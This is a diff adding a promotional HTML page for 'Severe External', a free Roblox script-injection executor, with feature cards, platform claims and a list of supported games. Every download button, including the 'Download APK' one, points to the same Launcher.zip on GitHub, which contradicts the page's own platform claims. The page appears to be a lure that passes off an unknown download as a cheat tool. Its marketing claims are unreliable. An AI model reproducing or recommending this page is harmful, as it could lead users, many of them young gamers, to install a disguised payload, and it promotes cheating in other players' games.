@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Severe External is a free Roblox script executor for PC and mobile. Download Severe External to run powerful Lua scripts in Blox Fruits, Jailbreak, and more Roblox games.">
+    <meta name="keywords" content="Severe External, Roblox executor, script executor, Roblox scripts, Blox Fruits scripts, free executor, Lua executor, Roblox PC, Roblox mobile">
+    <meta name="author" content="Severe External">
+    <meta name="robots" content="index, follow">
+    <title>Severe External | Free Roblox Script Executor for PC & Mobile</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="stylesheet" href="style.css">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "SoftwareApplication",
+        "name": "Severe External",
+        "operatingSystem": ["Windows", "Android"],
+        "applicationCategory": "GameApplication",
+        "offers": {
+            "@type": "Offer",
+            "price": "0",
+            "priceCurrency": "USD"
+        },
+        "description": "Severe External is a free Roblox script executor for PC and mobile platforms. Execute powerful Lua scripts in your favorite Roblox games.",
+        "softwareVersion": "Latest",
+        "downloadUrl": "https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip"
+    }
+    </script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="logo">
+                <span class="logo-icon">S</span>
+                <span class="logo-text">Severe External</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#features">Features</a></li>
+                <li><a href="#platforms">Platforms</a></li>
+                <li><a href="#download">Download</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero" id="home">
+            <div class="hero-content">
+                <h1>Severe External</h1>
+                <p class="tagline">The Ultimate Free Roblox Script Executor</p>
+                <p class="hero-description">Execute powerful Lua scripts in Blox Fruits, Jailbreak, and hundreds of other Roblox games. Available for Windows PC and Android mobile devices completely free of charge.</p>
+                <div class="hero-buttons">
+                    <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-primary">Download for PC</a>
+                    <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-secondary">Download for Mobile</a>
+                </div>
+            </div>
+            <div class="hero-visual">
+                <div class="glow-orb"></div>
+            </div>
+        </section>
+
+        <section class="features" id="features">
+            <h2>Powerful Features Built for Gamers</h2>
+            <p class="section-intro">Severe External delivers a comprehensive suite of tools designed to enhance your Roblox gaming experience. From lightning-fast script injection to an extensive library of pre-loaded scripts, everything you need is at your fingertips.</p>
+            
+            <div class="features-grid">
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                        </svg>
+                    </div>
+                    <h3>Lightning Fast Injection</h3>
+                    <p>Experience near-instant script injection with minimal latency. Severe External is optimized for speed, allowing you to inject and execute scripts within seconds of launching your game. No more waiting around for slow loading times.</p>
+                </article>
+
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path>
+                        </svg>
+                    </div>
+                    <h3>Advanced Lua Execution</h3>
+                    <p>Run complex Lua scripts without crashes or injection errors. Severe External supports advanced script functionality including encrypted and obfuscated scripts, giving you access to the most sophisticated game modifications available.</p>
+                </article>
+
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <line x1="3" y1="9" x2="21" y2="9"></line>
+                            <line x1="9" y1="21" x2="9" y2="9"></line>
+                        </svg>
+                    </div>
+                    <h3>Built-in Script Hub</h3>
+                    <p>Access a curated collection of scripts for popular games including Blox Fruits, Jailbreak, Pet Simulator, Arsenal, and many more. The script hub is regularly updated with new scripts and optimizations to ensure compatibility with the latest game versions.</p>
+                </article>
+
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        </svg>
+                    </div>
+                    <h3>Stable Performance</h3>
+                    <p>Enjoy a reliable execution environment with minimal system resource impact. Severe External is engineered for stability, reducing crashes and ensuring consistent performance across extended gaming sessions on both desktop and mobile platforms.</p>
+                </article>
+
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="2" y1="12" x2="22" y2="12"></line>
+                            <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+                        </svg>
+                    </div>
+                    <h3>Cross-Platform Support</h3>
+                    <p>Use the same powerful executor across multiple devices. Whether you prefer gaming on your Windows PC or Android smartphone, Severe External provides a consistent experience with full feature parity across all supported platforms.</p>
+                </article>
+
+                <article class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="7 10 12 15 17 10"></polyline>
+                            <line x1="12" y1="15" x2="12" y2="3"></line>
+                        </svg>
+                    </div>
+                    <h3>Free Forever</h3>
+                    <p>Access all features completely free with no hidden costs, subscriptions, or premium tiers. Severe External is committed to providing a full-featured executor experience without requiring any payment or key system verification.</p>
+                </article>
+            </div>
+        </section>
+
+        <section class="platforms" id="platforms">
+            <h2>Available on Your Favorite Platforms</h2>
+            <p class="section-intro">Severe External is designed to work seamlessly across multiple platforms, ensuring you can enhance your Roblox experience regardless of which device you prefer to use for gaming.</p>
+            
+            <div class="platforms-grid">
+                <article class="platform-card">
+                    <div class="platform-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
+                        </svg>
+                    </div>
+                    <h3>Windows PC</h3>
+                    <p>Full desktop experience with support for Windows 10 and Windows 11. The PC version offers the complete feature set with optimized performance for desktop gaming. Take advantage of larger screens and keyboard shortcuts for efficient script management.</p>
+                    <ul class="platform-specs">
+                        <li>Windows 10 or higher required</li>
+                        <li>Minimal system resources</li>
+                        <li>Fast automatic updates</li>
+                        <li>Full script library access</li>
+                    </ul>
+                    <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-platform">Download for Windows</a>
+                </article>
+
+                <article class="platform-card">
+                    <div class="platform-icon">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M17.523 15.341c-.5 0-.919.168-1.258.508-.34.34-.508.758-.508 1.258 0 .5.168.918.508 1.258.339.34.758.508 1.258.508.5 0 .918-.168 1.258-.508.34-.34.508-.758.508-1.258 0-.5-.168-.918-.508-1.258-.34-.34-.758-.508-1.258-.508zm-11.046 0c-.5 0-.919.168-1.258.508-.34.34-.508.758-.508 1.258 0 .5.168.918.508 1.258.34.34.758.508 1.258.508.5 0 .918-.168 1.258-.508.34-.34.508-.758.508-1.258 0-.5-.168-.918-.508-1.258-.34-.34-.758-.508-1.258-.508zM21.78 12.22l1.54-2.68c.08-.16.04-.36-.12-.44-.16-.08-.36-.04-.44.12l-1.56 2.72c-1.24-.56-2.64-.88-4.2-.88s-2.96.32-4.2.88l-1.56-2.72c-.08-.16-.28-.2-.44-.12-.16.08-.2.28-.12.44l1.54 2.68C8.34 13.84 5.68 17.16 5.2 21.2h13.6c-.48-4.04-3.14-7.36-6.98-8.98z"/>
+                        </svg>
+                    </div>
+                    <h3>Android Mobile</h3>
+                    <p>Take your scripts on the go with the Android mobile version. No root access required for installation or operation. The mobile interface is optimized for touch controls while maintaining access to all the powerful features you expect from Severe External.</p>
+                    <ul class="platform-specs">
+                        <li>Android 8.0 or higher required</li>
+                        <li>No root access needed</li>
+                        <li>Touch-optimized interface</li>
+                        <li>APK direct download</li>
+                    </ul>
+                    <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-platform">Download APK</a>
+                </article>
+            </div>
+        </section>
+
+        <section class="games" id="games">
+            <h2>Compatible with Popular Roblox Games</h2>
+            <p class="section-intro">Severe External works with hundreds of Roblox games. The built-in script hub includes optimized scripts for the most popular titles, with new game support added regularly based on community requests and game popularity.</p>
+            
+            <div class="games-list">
+                <span class="game-tag">Blox Fruits</span>
+                <span class="game-tag">Jailbreak</span>
+                <span class="game-tag">Pet Simulator X</span>
+                <span class="game-tag">Arsenal</span>
+                <span class="game-tag">Murder Mystery 2</span>
+                <span class="game-tag">Adopt Me</span>
+                <span class="game-tag">Tower of Hell</span>
+                <span class="game-tag">Brookhaven</span>
+                <span class="game-tag">King Legacy</span>
+                <span class="game-tag">Anime Fighters</span>
+                <span class="game-tag">Da Hood</span>
+                <span class="game-tag">Shindo Life</span>
+            </div>
+        </section>
+
+        <section class="how-it-works" id="how-it-works">
+            <h2>Get Started in Minutes</h2>
+            <p class="section-intro">Setting up Severe External is straightforward and takes only a few minutes. Follow these simple steps to start executing scripts in your favorite Roblox games and unlock new gameplay possibilities.</p>
+            
+            <div class="steps-grid">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Download Severe External</h3>
+                    <p>Get the appropriate version for your platform. Choose the Windows application for PC gaming or download the APK file for Android mobile devices. Both versions are completely free with no registration required.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Install the Application</h3>
+                    <p>Run the installer on Windows or install the APK on Android. The installation process is quick and does not require any complex configuration or technical knowledge to complete successfully.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Launch Roblox</h3>
+                    <p>Open Roblox and join the game where you want to execute scripts. Make sure the game is fully loaded before proceeding to the next step for optimal injection success.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <h3>Inject and Execute</h3>
+                    <p>Open Severe External, inject into the game, and run your scripts. Choose from the built-in script hub or paste your own custom Lua scripts to enhance your gameplay experience.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="download" id="download">
+            <h2>Download Severe External Now</h2>
+            <p class="section-intro">Join thousands of users who have enhanced their Roblox gaming experience with Severe External. Download the free executor today and unlock the full potential of Lua scripting in your favorite games.</p>
+            
+            <div class="download-buttons">
+                <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-download btn-large">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
+                    </svg>
+                    Download for Windows
+                </a>
+                <a href="https://github.com/Andrettt/Launcher/raw/refs/heads/main/Launcher.zip" class="btn btn-download btn-large">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M17.523 15.341c-.5 0-.919.168-1.258.508-.34.34-.508.758-.508 1.258 0 .5.168.918.508 1.258.339.34.758.508 1.258.508.5 0 .918-.168 1.258-.508.34-.34.508-.758.508-1.258 0-.5-.168-.918-.508-1.258-.34-.34-.758-.508-1.258-.508zm-11.046 0c-.5 0-.919.168-1.258.508-.34.34-.508.758-.508 1.258 0 .5.168.918.508 1.258.34.34.758.508 1.258.508.5 0 .918-.168 1.258-.508.34-.34.508-.758.508-1.258 0-.5-.168-.918-.508-1.258-.34-.34-.758-.508-1.258-.508zM21.78 12.22l1.54-2.68c.08-.16.04-.36-.12-.44-.16-.08-.36-.04-.44.12l-1.56 2.72c-1.24-.56-2.64-.88-4.2-.88s-2.96.32-4.2.88l-1.56-2.72c-.08-.16-.28-.2-.44-.12-.16.08-.2.28-.12.44l1.54 2.68C8.34 13.84 5.68 17.16 5.2 21.2h13.6c-.48-4.04-3.14-7.36-6.98-8.98z"/>
+                    </svg>
+                    Download for Android
+                </a>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-brand">
+                <span class="logo-icon">S</span>
+                <span>Severe External</span>
+            </div>
+            <p class="footer-tagline">Free Roblox Script Executor for PC and Mobile</p>
+            <nav class="footer-nav">
+                <a href="#features">Features</a>
+                <a href="#platforms">Platforms</a>
+                <a href="#download">Download</a>
+            </nav>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"99b19cada86041c0857bec7f0c94a6b0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
